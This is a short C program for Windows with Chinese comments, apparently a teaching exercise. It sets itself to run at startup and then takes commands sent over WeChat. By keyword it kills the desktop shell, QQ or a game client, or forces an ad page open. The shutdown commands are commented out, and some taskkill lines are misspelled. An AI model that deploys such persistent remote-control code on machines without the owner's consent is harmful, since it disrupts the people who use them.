#include <stdio.h>
#include <windows.h>
#include "itmojun.h"

#pragma comment(lib,"itmojun.lib")

int main()
{
	char cmd[301];//(从微信端接收消息)
	AutoRun();//将当前程序设置为开机自动运行
	while(1)
	{
		//GetPCCmd函数的功能：从微信端接收一条消息，如果没有任何消息它会一直等待
		//第一个参数为电脑ID,不同电脑建议使用不同的ID
		//第二个参数为接收消息
	GetPCCmd("wyj",cmd);
	printf("%s\n",cmd);
	//strstr函数的功能，在一个字符串中查找字符串，如果找到则返回其指针，否则返回NULL
	if(strstr(cmd,"关机"))
	{
		//WinExec("shutdown -s -t 0",0)
	}
	else if(strstr(cmd,"重启"))
	{
		//重启
	    //WinExec("shutdown -s -t 0",0);
	}
	else if(strstr(cmd,"桌面"))
	{
		static int kill_flag=1;
		if(kill_flag)
		//干掉桌面
	    WinExec("taskkill /f /im explorer.exe",0);
		else 
		//恢复桌面
	    WinExec("c:\\Windows\\explorer.exe",1);
		kill_flag=!kill_flag;
	}
	else if(strstr(cmd,"杀企鹅"))
	{
		//干掉QQ
		WinExec("taskkill /f im qq.exe",0);

	}
	else if(strstr(cmd,"亚索"))
	{
		WinExec("tackkill /f im client.exe",0);
	}
	else if(strstr(cmd,"广告"))
	{//强制打开广告页面
		WinExec("explorer https://itmojun.com",1);
	}
	Sleep(3000);//延时3秒
	}
	return 0;
}
